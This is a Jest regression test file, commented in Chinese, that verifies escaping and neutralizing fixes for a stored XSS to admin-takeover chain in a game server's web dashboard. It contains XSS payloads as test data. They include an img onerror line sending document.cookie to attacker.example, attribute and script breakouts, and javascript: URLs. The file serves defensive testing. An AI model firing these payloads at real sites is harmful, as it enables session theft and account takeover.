/**
 * 存储型 XSS 修复回归测试
 *
 * 对应漏洞：web-dashboard 存储型 XSS + 管理员接管链。
 * 链路：任意玩家经 TCP Chat 发送含 HTML/JS 的 content → 原样存入 room.messages
 *       → websocket 插件 getSanitizedRoomDetails 原样下发
 *       → room.js 把 m.content 拼进 innerHTML → 管理员浏览器执行攻击者 JS
 *       → 以管理员身份调用 /api/admin/*（cookie 自动附带，httpOnly 也挡不住）。
 *
 * 本测试锁定修复后的两条防线：
 *   1. 渲染端输出编码（plugins/web-dashboard/res/public/sanitize.js）
 *   2. WebSocket 出口中和（plugins/websocket/res/lib/textSafety.js）
 *
 * 关键设计：每个断言都配一个「反证」用例——先证明**未修复**的写法确实会被
 * 载荷击穿，再证明修复后的输出拦住了它。否则一个恒为真的断言无法证明任何事。
 */
import * as path from 'path';

const repoRoot = path.join(__dirname, '..');

// eslint-disable-next-line @typescript-eslint/no-var-requires
const sanitize = require(path.join(repoRoot, 'plugins/web-dashboard/res/public/sanitize.js'));
// eslint-disable-next-line @typescript-eslint/no-var-requires
const textSafety = require(path.join(repoRoot, 'plugins/websocket/res/lib/textSafety.js'));

const { escapeHtml, escapeAttr, escapeJs, safeUrl } = sanitize;
const { neutralizeMarkup, neutralizeRoomMessage, neutralizeRoomMessages } = textSafety;

/** 漏洞报告里给出的 PoC 载荷 */
const CHAT_POC = `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`;

/** 任何能开启一个新标签的字符串都是失败信号 */
const NEW_TAG = /<[a-zA-Z/!]/;

describe('渲染端输出编码 (sanitize.js)', () => {
  describe('escapeHtml / escapeAttr', () => {
    it('中和漏洞报告中的聊天 XSS 载荷，使其无法产生任何元素', () => {
      const out = escapeHtml(CHAT_POC);

      expect(NEW_TAG.test(out)).toBe(false);
      expect(out).not.toContain('<');
      expect(out).not.toContain('>');
      // 载荷仍然以纯文本形式可见，只是不再具备语法意义
      expect(out).toContain('&lt;img');
      expect(out).toContain('&quot;');
    });

    it('反证：未转义的写法确实会被击穿（证明上面的断言有意义）', () => {
      // 修复前 room.js 的写法等价于直接拼接原始载荷
      const vulnerable = `<span class="msg-chat">${CHAT_POC}</span>`;
      expect(NEW_TAG.test(vulnerable)).toBe(true);
      expect(vulnerable).toContain('<img src=x onerror=');
    });

    it('拦截属性闭合型载荷（引号越界插入新属性）', () => {
      const payloads = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '"><script>alert(1)</script>',
        "'><img src=x onerror=alert(1)>",
        '`onmouseover=alert(1)',
      ];

      for (const p of payloads) {
        const out = escapeHtml(p);
        expect(NEW_TAG.test(out)).toBe(false);
        expect(out).not.toContain('"');
        expect(out).not.toContain("'");
      }
    });

    it('转义 & 以免载荷借实体复现标记', () => {
      expect(escapeHtml('&lt;img src=x onerror=alert(1)&gt;')).toBe(
        '&amp;lt;img src=x onerror=alert(1)&amp;gt;',
      );
    });

    it('escapeAttr 与 escapeHtml 同样转义引号', () => {
      expect(escapeAttr('a"b\'c')).toBe(escapeHtml('a"b\'c'));
      expect(escapeAttr('a"b\'c')).not.toContain('"');
    });

    it('null/undefined 渲染为空串而不是 "undefined"', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml(0)).toBe('0');
    });
  });

  describe('escapeJs（内联事件处理器里的 JS 字符串上下文）', () => {
    /** 把转义结果当作 `onclick="f('<此处>')"` 里的字符串字面量求值 */
    function evalInJsStringLiteral(encoded: string): any {
      let captured: any;
      // eslint-disable-next-line no-new-func
      const fn = new Function('f', `f('${encoded}');`);
      fn((v: any) => {
        captured = v;
      });
      return captured;
    }

    const breakout = "'); globalThis.__XSS_BREAKOUT__ = true; //";

    it('反证：未转义的载荷会越出 JS 字符串并执行任意语句', () => {
      (globalThis as any).__XSS_BREAKOUT__ = undefined;

      evalInJsStringLiteral(breakout);

      // 逃逸成功：注入的赋值语句被执行了
      expect((globalThis as any).__XSS_BREAKOUT__).toBe(true);
      delete (globalThis as any).__XSS_BREAKOUT__;
    });

    it('转义后载荷被完整保留为字符串字面量，无法越界执行', () => {
      (globalThis as any).__XSS_BREAKOUT__ = undefined;
      const encoded = escapeJs(breakout);

      const captured = evalInJsStringLiteral(encoded);

      expect((globalThis as any).__XSS_BREAKOUT__).toBeUndefined();
      // 值没有被破坏，只是再也无法终止字符串
      expect(captured).toBe(breakout);
      // 每一个单引号都被反斜杠转义，不存在未转义的闭合引号
      expect(/(^|[^\\])'/.test(encoded)).toBe(false);
      delete (globalThis as any).__XSS_BREAKOUT__;
    });

    it('转义 </script>、<、>、& 与行终止符，防止属性/脚本块被撕开', () => {
      const encoded = escapeJs('</script><img src=x>&\u2028\u2029"\\');
      expect(encoded).not.toContain('<');
      expect(encoded).not.toContain('>');
      expect(encoded).not.toContain('&');
      expect(encoded).toContain('\\x3c');
      expect(encoded).toContain('\\u2028');
      expect(encoded).toContain('\\u2029');
    });
  });

  describe('safeUrl（src / href 伪协议）', () => {
    it('放行站内相对路径与 https/图片 data URL', () => {
      expect(safeUrl('room.html?id=abc')).toBe('room.html?id=abc');
      expect(safeUrl('/api/status')).toBe('/api/status');
      expect(safeUrl('https://phira.5wyxi.com/files/x')).toBe('https://phira.5wyxi.com/files/x');
      expect(safeUrl('data:image/svg+xml,%3Csvg%3E')).toBe('data:image/svg+xml,%3Csvg%3E');
      expect(safeUrl('#')).toBe('#');
    });

    it('拦截 javascript: / vbscript: / data:text/html', () => {
      expect(safeUrl('javascript:alert(document.cookie)')).toBe('');
      expect(safeUrl('JavaScript:alert(1)')).toBe('');
      expect(safeUrl('vbscript:msgbox(1)')).toBe('');
      expect(safeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
    });

    it('拦截用控制字符/空白混淆的伪协议', () => {
      expect(safeUrl('java\nscript:alert(1)')).toBe('');
      expect(safeUrl('java\tscript:alert(1)')).toBe('');
      expect(safeUrl('  javascript:alert(1)  ')).toBe('');
      expect(safeUrl('\u0000javascript:alert(1)')).toBe('');
    });
  });
});

describe('WebSocket 出口中和 (textSafety.js)', () => {
  it('剥离聊天内容里的标记定界符（漏洞链的传输层）', () => {
    const out = neutralizeMarkup(CHAT_POC);

    expect(NEW_TAG.test(out)).toBe(false);
    expect(out).not.toContain('<');
    expect(out).not.toContain('>');
    // 中和后原文的可见部分仍在
    expect(out).toContain('img src=x onerror=');
  });

  it('反证：不中和时下游拿到的是可直接渲染的活载荷', () => {
    expect(NEW_TAG.test(CHAT_POC)).toBe(true);
  });

  it('中和 Chat 消息对象中的 content，且不修改原始对象', () => {
    const original = { type: 'Chat', user: 7, content: CHAT_POC };
    const safe = neutralizeRoomMessage(original);

    expect(NEW_TAG.test(safe.content)).toBe(false);
    // 原始数据未被污染：TCP 协议下发给游戏客户端的仍是原文
    expect(original.content).toBe(CHAT_POC);
  });

  it('中和 JoinRoom/LeaveRoom 事件里的玩家昵称', () => {
    const safe = neutralizeRoomMessage({
      type: 'JoinRoom',
      user: 1,
      name: '<script>alert(1)</script>',
      userName: '<img src=x onerror=alert(1)>',
    });
    expect(NEW_TAG.test(safe.name)).toBe(false);
    expect(NEW_TAG.test(safe.userName)).toBe(false);
  });

  it('幂等：重复中和结果不变', () => {
    const once = neutralizeMarkup(CHAT_POC);
    expect(neutralizeMarkup(once)).toBe(once);
  });

  it('保留换行/制表符，剔除不可见控制字符', () => {
    expect(neutralizeMarkup('line1\nline2\ttabbed')).toBe('line1\nline2\ttabbed');
    expect(neutralizeMarkup('a\u0000b\u0007c')).toBe('abc');
  });

  it('非字符串入参原样返回（数字/null 不受影响）', () => {
    expect(neutralizeMarkup(42)).toBe(42);
    expect(neutralizeMarkup(null)).toBe(null);
    expect(neutralizeMarkup(undefined)).toBe(undefined);
  });

  it('脏 messages 入参归一为空数组，避免下游 .map() 抛错', () => {
    expect(neutralizeRoomMessages(undefined)).toEqual([]);
    expect(neutralizeRoomMessages(null)).toEqual([]);
    expect(neutralizeRoomMessages('nope')).toEqual([]);
    expect(neutralizeRoomMessages([null, 'x'])).toEqual([null, 'x']);
  });
});

describe('端到端：修补后的房间消息渲染无法生成元素', () => {
  /**
   * 复刻 room.js 中 Chat 分支的拼接形状（修复后版本），
   * 断言渲染产物中不存在任何新的标签起点。
   */
  function renderChatMessage(m: { userName: string; content: string }) {
    const uName = escapeHtml(m.userName);
    const text = `<span class="msg-user">${uName}:</span><span class="msg-chat">${escapeHtml(
      m.content,
    )}</span>`;
    return `<div class="message-item">${text}</div>`;
  }

  it('聊天载荷 + 恶意昵称都无法在渲染结果里形成元素', () => {
    const html = renderChatMessage({
      userName: '<img src=x onerror=alert(1)>',
      content: CHAT_POC,
    });

    // 载荷里的 > 已被转义为 &gt;，所以下面这个匹配只会捞到**真实的标签**。
    // 逐一断言它们全部来自我们自己的页面骨架（div/span），
    // 即：载荷一个标签都没能新增。
    const tags = html.match(/<[^>]*>/g) || [];
    const skeletonTag = /^<\/?(?:div|span)\b[^>]*>$/;
    expect(tags.length).toBe(6);
    for (const tag of tags) {
      expect(tag).toMatch(skeletonTag);
    }

    // 载荷的每个 < 都退化成实体，只能作为文本显示
    expect((html.match(/&lt;/g) || []).length).toBe(2);
    expect(html).toContain('&lt;img src=x onerror=');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<script');

    // 结构骨架未被破坏
    expect(html).toContain('<div class="message-item">');
    expect(html).toContain('<span class="msg-chat">');
  });

  it('反证：同样的输入在修复前的拼接下会产生可执行 img', () => {
    const vulnerable =
      `<div class="message-item"><span class="msg-user">` +
      `</span><span class="msg-chat">${CHAT_POC}</span></div>`;

    expect(vulnerable).toContain('<img src=x onerror=');
    expect(NEW_TAG.test(vulnerable)).toBe(true);
  });
});
